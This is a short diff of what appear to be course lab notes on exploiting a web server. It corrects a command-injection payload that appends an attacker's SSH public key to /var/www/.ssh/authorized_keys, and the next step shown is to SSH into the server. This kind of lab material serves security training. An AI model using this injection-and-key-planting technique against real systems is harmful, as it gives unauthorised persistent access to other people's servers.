@@ -35,7 +35,7 @@ ls -la ../../.ssh/
 
 ##back to the command injection site 
 
-; echo "(paste ==student@lin-ops)">>/var/www/ssh/authorized_keys ##not the actual conents drop everything between the () in stead us the past content 
+; echo "(paste ==student@lin-ops)">>/var/www/.ssh/authorized_keys ##not the actual conents drop everything between the () in stead us the past content 
 
 ### attempt to ssh to the webserver 
 
